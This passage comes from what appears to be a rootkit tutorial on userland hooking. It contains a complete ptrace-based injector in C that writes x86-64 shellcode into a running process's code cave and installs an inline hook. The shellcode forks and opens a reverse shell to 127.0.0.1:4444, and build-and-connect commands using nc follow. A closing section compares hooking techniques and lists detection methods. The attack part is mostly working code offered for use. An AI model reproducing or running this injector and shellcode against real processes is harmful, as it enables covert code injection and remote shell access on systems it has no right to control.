    printf("  RBP: 0x%llx\n", uc->uc_mcontext.gregs[REG_RBP]);
    printf("  RAX: 0x%llx\n", uc->uc_mcontext.gregs[REG_RAX]);
    printf("  RBX: 0x%llx\n", uc->uc_mcontext.gregs[REG_RBX]);
    printf("  RCX: 0x%llx\n", uc->uc_mcontext.gregs[REG_RCX]);
    printf("  RDX: 0x%llx\n", uc->uc_mcontext.gregs[REG_RDX]);
    printf("  RSI: 0x%llx\n", uc->uc_mcontext.gregs[REG_RSI]);
    printf("  RDI: 0x%llx\n", uc->uc_mcontext.gregs[REG_RDI]);
    printf("\n");
    
    // Try to read memory at RIP to see what instruction caused crash
    unsigned char *rip = (unsigned char *)uc->uc_mcontext.gregs[REG_RIP];
    printf("Bytes at crash RIP:\n  ");
    for (int i = -5; i < 10; i++)
    {
        if (i == 0) printf("[");
        printf("%02x ", rip[i]);
        if (i == 0) printf("]");
    }
    printf("\n\n");
    
    // Read stack
    unsigned long *stack = (unsigned long *)uc->uc_mcontext.gregs[REG_RSP];
    printf("Stack dump (top 10 values):\n");
    for (int i = 0; i < 10; i++)
    {
        printf("  [RSP+0x%02x]: 0x%016lx\n", i * 8, stack[i]);
    }
    
    printf("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n");
    
    // Exit cleanly
    exit(1);
}

void wait_for_input(void)
{
    call_count++;
    
    pid_t tid = syscall(SYS_gettid);
    pid_t pid = getpid();
    
    printf("\n");
    printf("┌────────────────────────────────────────┐\n");
    printf("│ wait_for_input() ENTRY                │\n");
    printf("└────────────────────────────────────────┘\n");
    printf("  Call #%d\n", call_count);
    printf("  PID: %d\n", pid);
    printf("  TID: %d\n", tid);
    printf("  Function address: %p\n", (void*)wait_for_input);
    
    // Print first few bytes of our own function
    unsigned char *func_bytes = (unsigned char *)wait_for_input;
    printf("  First bytes of function:");
    for (int i = 0; i < 16; i++)
        printf(" %02x", func_bytes[i]);
    printf("\n");
    printf("\n");
    
    printf("Press Enter to continue...");
    fflush(stdout);
    
    getchar();
    
    printf("\n");
    printf("┌────────────────────────────────────────┐\n");
    printf("│ wait_for_input() EXIT                 │\n");
    printf("└────────────────────────────────────────┘\n");
    printf("  About to return from call #%d\n", call_count);
    printf("  If you see this, function executed OK\n");
    printf("\n");
    
    printf("Continuing...\n\n");
}

int main(void)
{
    // Install segfault handler
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_flags = SA_SIGINFO;
    sa.sa_sigaction = segfault_handler;
    sigaction(SIGSEGV, &sa, NULL);
    
    printf("\n");
    printf("========================================\n");
    printf("  INSTRUMENTED DEBUG TARGET\n");
    printf("  (with segfault handler)\n");
    printf("========================================\n");
    printf("  PID: %d\n", getpid());
    printf("  TID: %d\n", (int)syscall(SYS_gettid));
    printf("  wait_for_input at: %p\n", (void*)wait_for_input);
    printf("\n");
    printf("  First bytes:");
    unsigned char *func_bytes = (unsigned char *)wait_for_input;
    for (int i = 0; i < 16; i++)
        printf(" %02x", func_bytes[i]);
    printf("\n");
    printf("========================================\n");
    printf("\n");
    
    int iteration = 0;
    while (1)
    {
        printf("╔════════════════════════════════════════╗\n");
        printf("║ Iteration %d                           ║\n", ++iteration);
        printf("╚════════════════════════════════════════╝\n");
        
        wait_for_input();
        
        printf("✓ Loop iteration %d complete\n", iteration);
        printf("  (function returned successfully)\n");
        printf("\n");
        
        sleep(1);
    }
    
    return 0;
}


-------------------

----[ injector.c ]---
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdint.h>

#define MIN_HOOK_SIZE 5  // Minimum bytes needed for JMP instruction

// 64-bit shell payload (based on your working 32-bit version)
unsigned char friendly_payload[] = {
    // fork() first - child does shell, parent continues
    0x6a, 0x39,                     // push 57 (sys_fork)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall

    // if parent, skip to trampoline
    0x48, 0x85, 0xc0,               // test rax, rax
    0x75, 0x00,                     // jnz <to_be_patched> (rel8 palceholder)

    // === CHILD: SHELL ===

    // socket(AF_INET, SOCK_STREAM, 0)
    0x6a, 0x29,                     // push 41 (sys_socket)
    0x58,                           // pop rax
    0x6a, 0x02,                     // push 2 (AF_INET)
    0x5f,                           // pop rdi
    0x6a, 0x01,                     // push 1 (SOCK_STREAM)
    0x5e,                           // pop rsi
    0x99,                           // cdq (rdx = 0)
    0x0f, 0x05,                     // syscall
    0x48, 0x89, 0xc7,               // mov rdi, rax (save sockfd)

    // Build sockaddr_in on stack
    0x52,                           // push rdx
    0x52,                           // push rdx
    0x66, 0xc7, 0x04, 0x24, 0x02, 0x00,           // mov word [rsp], 0x0002   ; AF_INET
    0x66, 0xc7, 0x44, 0x24, 0x02, 0x11, 0x5c,     // mov word [rsp+2], 0x5c11 ; htons(4444)
    0xc7, 0x44, 0x24, 0x04, 0x7f, 0x00, 0x00, 0x01, // mov dword [rsp+4], 0x0100007f ; 127.0.0.1

    // connect(sockfd, &sockaddr, 16)
    0x48, 0x89, 0xe6,               // mov rsi, rsp
    0x6a, 0x10,                     // push 16
    0x5a,                           // pop rdx
    0x6a, 0x2a,                     // push 42 (sys_connect)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall

    // dup2 loop: stdin/stdout/stderr
    0x6a, 0x03,                     // push 3
    0x5e,                           // pop rsi
    // dup_loop:
    0x48, 0xff, 0xce,               // dec rsi
    0x6a, 0x21,                     // push 33 (sys_dup2)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall
    0x75, 0xf6,                     // jnz dup_loop

    // execve("/bin//sh", ["/bin//sh"], NULL)
    0x99,                           // cdq
    0x52,                           // push rdx
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,  // movabs rbx, "//sh\x00nib/"
    0x53,                           // push rbx
    0x48, 0x89, 0xe7,               // mov rdi, rsp
    0x52,                           // push rdx
    0x57,                           // push rdi
    0x48, 0x89, 0xe6,               // mov rsi, rsp
    0x6a, 0x3b,                     // push 59 (sys_execve)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall

    // === PARENT: TRAMPOLINE ===
    // parent_path:
    // Space for stolen bytes (will be filled at injection time)
    0x90, 0x90, 0x90, 0x90, 0x90,   // nop x5 (placeholder for stolen instructions)
    0x90, 0x90, 0x90, 0x90, 0x90,   // nop x5 (extra space if needed)
    0x90, 0x90, 0x90, 0x90, 0x90,   // nop x5 (extra space if needed)

    // Jump back to original function
    0x48, 0xb8,                     // movabs rax, imm64
    0x00, 0x00, 0x00, 0x00,         // [return address - will be patched]
    0x00, 0x00, 0x00, 0x00,
    0xff, 0xe0,                     // jmp rax
};

// Simple instruction length decoder for x86-64
// Returns the length of the instruction at 'bytes'
int calc_instr_len(unsigned char *bytes)
{
    // Special-case common prologue first, before stripping prefixes
    if (bytes[0] == 0x48 && bytes[1] == 0x83 && bytes[2] == 0xec)
        return 4;  // 48 83 ec XX

    if (bytes[0] == 0x48 && bytes[1] == 0x81 && bytes[2] == 0xec)
        return 7;  // 48 81 ec XX XX XX XX

    unsigned char opcode = bytes[0];
    int offset = 0;

    while (opcode == 0x66 || opcode == 0x67 ||
           opcode == 0xf0 || opcode == 0xf2 || opcode == 0xf3 ||
           (opcode >= 0x40 && opcode <= 0x4f)) // REX
    {
        offset++;
        opcode = bytes[offset];
    }

    // Common single-byte instructions
    if (opcode == 0x50 || opcode == 0x51 || opcode == 0x52 || opcode == 0x53 ||
        opcode == 0x54 || opcode == 0x55 || opcode == 0x56 || opcode == 0x57)  // push reg
        return offset + 1;

    if (opcode == 0x58 || opcode == 0x59 || opcode == 0x5a || opcode == 0x5b ||
        opcode == 0x5c || opcode == 0x5d || opcode == 0x5e || opcode == 0x5f)  // pop reg
        return offset + 1;

    if (opcode == 0x90)  // nop
        return offset + 1;

    if (opcode == 0xc3 || opcode == 0xcb)  // ret
        return offset + 1;

    // Two-byte opcodes starting with 0x0f
    if (opcode == 0x0f)
        return offset + 2 + 1;  // Simplified - many 0f opcodes need ModR/M

    // MOV instructions (0x89, 0x8b with ModR/M)
    if (opcode == 0x89 || opcode == 0x8b)
    {
        unsigned char modrm = bytes[offset + 1];
        int mod = (modrm >> 6) & 3;

        if (mod == 3)  // Register-to-register
            return offset + 2;
        else if (mod == 0)  // [reg]
            return offset + 2;
        else if (mod == 1)  // [reg + disp8]
            return offset + 3;
        else  // mod == 2: [reg + disp32]
            return offset + 6;
    }

    // SUB rsp, imm (common in prologues)
    if (opcode == 0x48 && bytes[offset + 1] == 0x83 && bytes[offset + 2] == 0xec)
        return offset + 4;  // 48 83 ec XX

    if (opcode == 0x48 && bytes[offset + 1] == 0x81 && bytes[offset + 2] == 0xec)
        return offset + 7;  // 48 81 ec XX XX XX XX

    // MOV with immediate
    if (opcode >= 0xb8 && opcode <= 0xbf)  // mov reg, imm32
        return offset + 5;

    if (opcode == 0x48 && bytes[offset + 1] >= 0xb8 && bytes[offset + 1] <= 0xbf)  // movabs reg, imm64
        return offset + 10;

    // Default fallback (not safe for production!)
    return 5;
}

// Find code cave in executable memory
void *locate_code_cave(pid_t target_pid, size_t needed_size)
{
    char map_path[256];
    snprintf(map_path, sizeof(map_path), "/proc/%d/maps", target_pid);

    FILE *maps_file = fopen(map_path, "r");
    if (!maps_file) return NULL;

    char line[512];
    void *found_addr = NULL;

    while (fgets(line, sizeof(line), maps_file))
    {
        unsigned long start, end;
        char perms[5];

        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3)
        {
            if (perms[0] == 'r' && perms[2] == 'x' && perms[3] == 'p')
            {
                size_t region_size = end - start;
                if (region_size > needed_size + 0x1000 && strstr(line, "target"))
                {
                    found_addr = (void *)(end - needed_size - 0x100);
                    break;
                }
            }
        }
    }

    fclose(maps_file);
    return found_addr;
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: %s <pid> <function_address_hex>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long target_func_addr = strtoul(argv[2], NULL, 16);

    printf("\n");
    printf("================================================\n");
    printf("  Proper Inline Hook with Trampoline\n");
    printf("================================================\n");
    printf("\n");
    printf("[*] Target PID: %d\n", target_pid);
    printf("[*] Target Function: 0x%lx\n", target_func_addr);

    // STEP 1: Attach to target process
    printf("\n[*] Attaching...\n");
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
    {
        perror("ptrace attach");
        return 1;
    }

    int wait_status;
    waitpid(target_pid, &wait_status, 0);
    printf("[+] Attached\n");

    // STEP 2: Read first 20 bytes of target function (to find instruction boundaries)
    printf("\n[*] Reading function bytes...\n");
    unsigned char original_bytes[20];

    for (int i = 0; i < 20; i += sizeof(long))
    {
        errno = 0;
        long word = ptrace(PTRACE_PEEKDATA, target_pid, (void *)(target_func_addr + i), NULL);
        if (errno != 0)
        {
            perror("ptrace peek");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
        memcpy(&original_bytes[i], &word, sizeof(long));
    }

    printf("    First 20 bytes:");
    for (int i = 0; i < 20; i++)
        printf(" %02x", original_bytes[i]);
    printf("\n");

    // STEP 3: Determine how many bytes we need to "steal" for the JMP
    printf("\n[*] Determining instruction boundaries...\n");
    int stolen_len = 0;
    int instr_count = 0;

    while (stolen_len < MIN_HOOK_SIZE)
    {
        int len = calc_instr_len(&original_bytes[stolen_len]);
        printf("    Instruction %d: %d bytes\n", instr_count + 1, len);
        stolen_len += len;
        instr_count++;
    }

    printf("[+] Need to steal %d bytes (%d instructions)\n", stolen_len, instr_count);

    if (stolen_len > 15)
    {
        printf("[!] Too many bytes to steal - function too complex\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }

    // STEP 4: Find a code cave in the target (where we'll put the trampoline/payload)
    void *cave_addr = locate_code_cave(target_pid, sizeof(friendly_payload));
    if (!cave_addr)
    {
        printf("[-] No code cave found\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Using code cave at: %p\n", cave_addr);

    // STEP 5: Patch payload with stolen bytes and return address
    //         (trampoline_nop_offset points at the NOP area inside friendly_payload)
    size_t trampoline_nop_offset = sizeof(friendly_payload) - 25;  // Location of NOPs
    memcpy(&friendly_payload[trampoline_nop_offset], original_bytes, stolen_len);

    unsigned long resume_address = target_func_addr + stolen_len;
    memcpy(&friendly_payload[sizeof(friendly_payload) - 10], &resume_address, 8);

    printf("[*] Trampoline will jump back to: 0x%lx\n", resume_address);

    // STEP 6: >>> THIS IS WHERE THE JNZ REL8 PATCH GOES <<<
    //
    // At this point, you know:
    //   - cave_addr              : runtime base address of the payload in target
    //   - trampoline_nop_offset  : offset inside friendly_payload of the parent trampoline
    //   - stolen_len             : how many bytes you copied there
    //
    // This is the place to:
    //   - find the 0x75 0x00 (jnz placeholder) inside friendly_payload
    //   - compute the rel8 displacement:
    //         rel = parent_start - (address_after_jnz)
    //     where:
    //         parent_start = cave_addr + trampoline_nop_offset
    //         address_after_jnz = (cave_addr + jnz_off + 2)
    //   - check that -128 <= rel <= 127
    //   - write rel into friendly_payload[jnz_off + 1]
    //
    // PSEUDOCODE:
    //
    //   size_t jnz_off = ... find 0x75 0x00 ...
    //   unsigned char *parent_start = (unsigned char *)cave_addr + trampoline_nop_offset;
    //   unsigned char *jnz_runtime  = (unsigned char *)cave_addr + jnz_off;
    //   unsigned char *next_instr   = jnz_runtime + 2;
    //   intptr_t rel = (intptr_t)(parent_start - next_instr);
    //   friendly_payload[jnz_off + 1] = (int8_t)rel;
    //
    // Drop your concrete implementation of that logic here:
    // Find the jnz (0x75 0x00) in the payload
    size_t jnz_off = (size_t)-1;
    for (size_t i = 0; i + 1 < sizeof(friendly_payload); ++i) {
        if (friendly_payload[i] == 0x75 && friendly_payload[i+1] == 0x00) {
            jnz_off = i;
            break;
        }
    }
    if (jnz_off == (size_t)-1) {
        fprintf(stderr, "[!] jnz placeholder not found in payload\n");
        // handle error / abort
    }

    // Where does the parent trampoline start (runtime address)?
    unsigned char *parent_start =
        (unsigned char *)cave_addr + trampoline_nop_offset;

    // Runtime address of this jnz and its "next instruction"
    unsigned char *jnz_runtime = (unsigned char *)cave_addr + jnz_off;
    unsigned char *next_instr  = jnz_runtime + 2; // jnz rel8 is 2 bytes

    // rel8: target = next_instr + rel8
    intptr_t rel = (intptr_t)(parent_start - next_instr);

    if (rel < -128 || rel > 127) {
        fprintf(stderr, "[!] jnz target out of rel8 range: %ld\n", (long)rel);
        // handle error (layout too big, fall back to different scheme, etc.)
    }

    // Patch the displacement byte *in the payload* before injecting it
    friendly_payload[jnz_off + 1] = (int8_t)rel;
    
    ///////////////// STEP 6 IMPLEMENTATION ABOVE ////////////////


    // STEP 7: Write patched payload into the code cave
    printf("\n[*] Writing payload (%zu bytes)...\n", sizeof(friendly_payload));
    for (size_t i = 0; i < sizeof(friendly_payload); i += sizeof(long))
    {
        long sc_word = 0;
        size_t chunk = sizeof(long);
        if (i + chunk > sizeof(friendly_payload))
            chunk = sizeof(friendly_payload) - i;

        memcpy(&sc_word, &friendly_payload[i], chunk);

        if (ptrace(PTRACE_POKEDATA, target_pid, cave_addr + i, sc_word) < 0)
        {
            perror("ptrace poke payload");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
    }
    printf("[+] Payload written\n");

    // STEP 8: Build JMP instruction at the original function entry
    int32_t jmp_relative = (int32_t)((int64_t)cave_addr - (int64_t)target_func_addr - 5);
    unsigned char jmp_inst[5];
    jmp_inst[0] = 0xe9;
    memcpy(&jmp_inst[1], &jmp_relative, 4);

    printf("\n[*] Installing hook...\n");
    printf("    Offset: 0x%x\n", jmp_relative);
    printf("    JMP bytes:");
    for (int i = 0; i < 5; i++)
        printf(" %02x", jmp_inst[i]);
    printf("\n");

    // Pad overwritten bytes with NOPs beyond the JMP
    unsigned char patch_bytes[15] = {0};
    memcpy(patch_bytes, jmp_inst, 5);
    for (int i = 5; i < stolen_len; i++)
        patch_bytes[i] = 0x90;  // NOP

    // STEP 9: Write hook into the original function prologue
    for (int i = 0; i < stolen_len; i += sizeof(long))
    {
        long orig_word = ptrace(PTRACE_PEEKDATA, target_pid, (void *)(target_func_addr + i), NULL);
        long patched_word = orig_word;

        int bytes_to_write = (i + sizeof(long) > stolen_len) ? stolen_len - i : sizeof(long);
        memcpy(&patched_word, &patch_bytes[i], bytes_to_write);

        if (ptrace(PTRACE_POKEDATA, target_pid, (void *)(target_func_addr + i), patched_word) < 0)
        {
            perror("ptrace poke hook");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
    }

    // STEP 10: Verify the hook bytes at the function entry
    long verify_word = ptrace(PTRACE_PEEKDATA, target_pid, (void *)target_func_addr, NULL);
    unsigned char *verify_bytes = (unsigned char *)&verify_word;
    printf("    Verification:");
    for (int i = 0; i < stolen_len && i < 8; i++)
        printf(" %02x", verify_bytes[i]);
    printf("\n");

    // STEP 11: Detach from target
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    printf("\n");
    printf("================================================\n");
    printf("  Hook Installed!\n");
    printf("================================================\n");
    printf("\n");
    printf("When function is called:\n");
    printf("  - Forks immediately\n");
    printf("  - Child follows payload child-path logic\n");
    printf("  - Parent executes trampoline and continues normally\n");
    printf("\n");

    return 0;
}


-------------------

Build and run:

----[ terminal ]---
# Compile
gcc -o target target.c -no-pie -fno-pic -fcf-protection=none -static
gcc -o injector injector.c

# Terminal 1: Run target
./target

# Terminal 2: Inject
./injector <PID> <ADDR>

# Terminal 3: When target waits for input, press Enter
# Then immediately connect:
nc 127.0.0.1 4444

# You now have a shell!
-------------------

 ____  _   _ __  __ __  __    _    ______   __
/ ___|| | | |  \/  |  \/  |  / \  |  _ \ \ / /
\___ \| | | | |\/| | |\/| | / _ \ | |_) \ V / 
 ___) | |_| | |  | | |  | |/ ___ \|  _ < | |  
|____/ \___/|_|  |_|_|  |_/_/   \_\_| \_\|_|  


----[ Summary: Userland Techniques ]------------------------------------------

WHAT YOU LEARNED:

    LD_PRELOAD        - Classic library hijacking
    GOT/PLT Hijacking - Direct runtime table patching
    Inline Hooking    - Function code modification with trampolines

KEY CONCEPTS:

    Multiple approaches to userland interception
    Each technique has different artifacts and detectability
    Various techniques avoid obvious LD_PRELOAD indicators
    Trade-offs between complexity, stealth, and reliability

TECHNIQUE COMPARISON:

    LD_PRELOAD:
        + Easy to implement and test
        + System-wide hooks possible
        - Easy to detect (env vars, /etc/ld.so.preload)
        - Ignored by static binaries and many “secure” exec cases
        
    GOT/PLT Hijacking:
        + No LD_PRELOAD environment artifacts
        + Per-process targeting after startup
        - Requires correct ELF parsing and symbol resolution
        - Memory integrity checks and full RELRO can block/detect
        
    Inline Hooking:
        + Maximum flexibility (can hook almost any code path)
        + Works even without dynamic linking tricks
        - Complex instruction handling on x86/x86_64
        - Requires code page modification (W^X / NX can interfere)

DETECTION METHODS:

    For LD_PRELOAD:
        Check /etc/ld.so.preload
        Check LD_PRELOAD environment variable
        Examine /proc/[PID]/maps for suspicious .so files
        
    For GOT/PLT:
        Compare GOT entries with expected (on-disk) values
        Scan .got/.got.plt for unexpected pointers into odd regions
        Watch for writes to GOT in running processes
        
    For Inline Hooks:
        Compare function prologues with known-good binaries
        Look for JMP/CALL stubs at function entry points
        Use integrity monitoring of code pages

YOU ARE NOW READY:

    [✓] Understand classic LD_PRELOAD hijacking
    [✓] Know how GOT/PLT hijacking redirects calls
    [✓] Can implement and analyze inline hooks
    [✓] Know the trade-offs and artifacts of each technique

Next we move to KERNEL ROOTKITS where we gain Ring 0 privileges and hook
syscalls directly at the kernel level using Ftrace, Kprobes, and eBPF.

            ▐              
            ▜▀ ▞▀▖▛▀▖▞▀▌▌ ▌
            ▐ ▖▛▀ ▌ ▌▚▄▌▌ ▌
             ▀ ▝▀▘▘ ▘▗▄▘▝▀▘
                                  
                   ONWARDS TO
                PART III: FTRACE
                   HOOKING

.EOF
